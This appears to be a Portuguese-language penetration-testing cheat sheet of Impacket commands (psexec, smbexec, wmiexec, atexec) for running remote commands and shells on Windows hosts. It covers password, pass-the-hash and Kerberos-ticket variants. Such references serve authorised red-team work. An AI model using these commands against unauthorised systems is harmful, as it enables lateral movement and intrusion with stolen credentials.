# impacket

% impacket, windows, exec

## PSEXEC com usuario
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
Cria um novo serviço (usando \pipe\svcctl via SMB)

```
psexec.py <domain>/<user>:<password>@<ip>
```

## PSEXEC com pass the Hash (pth)
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
cria um novo serviço (usando \pipe\svcctl via SMB)

```
psexec.py -hashes <hash> <user>@<ip>
```

## PSEXEC com kerberos
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
cria um novo serviço (usando \pipe\svcctl via SMB)

```
export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
```

## SMBEXEC com username
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
cria um novo serviço 'BTOBTO' (usando arquivos bat temporários via SMB)
```
smbexec.py <domain>/<user>:<password>@<ip>
```

## SMBEXEC com pass the Hash (pth)
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
cria um novo serviço 'BTOBTO' (usando arquivos bat temporários via SMB)
```
smbexec.py -hashes <hash> <user>@<ip>
```

## SMBEXEC com kerberos
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
cria um novo serviço 'BTOBTO' (usando arquivos bat temporários via SMB)
```
export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
```

## wmiexec
#plataforma/linux #alvo/remoto #porta/135 #protocolo/wmi #cat/ATTACK/CONNECT  
Executa uma shell de comandos sem tocar no disco ou rodar um novo serviço usando o DCOM

```
wmiexec.py <domain>/<user>:<password>@<ip>
```

## wmiexec  with pass the hash (pth) 
#plataforma/linux #alvo/remoto #porta/135 #protocolo/wmi #cat/ATTACK/CONNECT  

Executa uma shell de comandos sem tocar no disco ou rodar um novo serviço usando o DCOM

```
wmiexec.py -hashes <hash> <user>@<ip>
```

## atexec - executa um comando em um host remoto criando uma tarefa agendada e executando de forma imediata.
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
Usando \pipe\atsvc via SMB


```
atexec.py <domain>/<user>:<password>@<ip> "command"
```

## atexec pass the hash (pth)
#plataforma/linux #alvo/remoto #porta/445 #protocolo/smb #cat/ATTACK/CONNECT  
executa um comando em um host remoto criando uma tarefa agendada e executando de forma imediata.
```
atexec.py -hashes <hash> <user>@<ip> "command"
```